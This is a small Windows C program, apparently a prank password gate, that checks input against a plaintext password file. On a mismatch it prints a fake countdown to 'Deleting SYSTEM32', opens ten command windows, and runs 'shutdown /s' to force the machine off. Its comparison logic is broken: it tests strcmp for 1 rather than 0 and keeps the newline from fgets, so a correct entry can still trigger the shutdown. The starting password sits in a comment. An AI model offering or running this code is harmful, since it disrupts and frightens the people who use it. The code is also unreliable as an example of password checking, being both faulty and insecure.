#include <Windows.h>
#include <stdio.h>

int main()
{
    //The first password will be kalipso
    FILE* fp;
    char keyName[100];

    if (fopen_s(&fp, "password.txt", "r") != 0) {
        printf("Error");
        return 1;
    }

    fscanf_s(fp, "%s", keyName, sizeof(keyName));

    fclose(fp);

    char password[100];
    printf("Write password(Word): ");
    fgets(password, sizeof(password), stdin);

    if (strcmp(password, keyName) == 1)
    {

        ShellExecute(NULL, "explore", "password.txt", NULL, NULL, SW_SHOWNORMAL);

        FILE* fout;
        fopen_s(&fout, "password.txt", "w");
        if (fout == NULL) {
            printf("Error\n");
        }
        else {
            char text[100];
            printf("Write new password(Word): ");
            fgets(text, sizeof(text), stdin);
            fprintf(fout, "%s", text);
            fclose(fout);
            ShellExecute(NULL, "explore", "password.txt", NULL, NULL, SW_SHOWNORMAL);
        }
    }
    else {
        int a = 5;
        for (int i = 0; i < 5; i++)
        {
            printf("Deleting SYSTEM32 in ");
            Sleep(400);
            a--;
        }
        for (int i = 0; i < 10; i++)
        {
            system("start");
        }
        system("C:\\Windows\\System32\\shutdown /s");
    }
    return 0;
}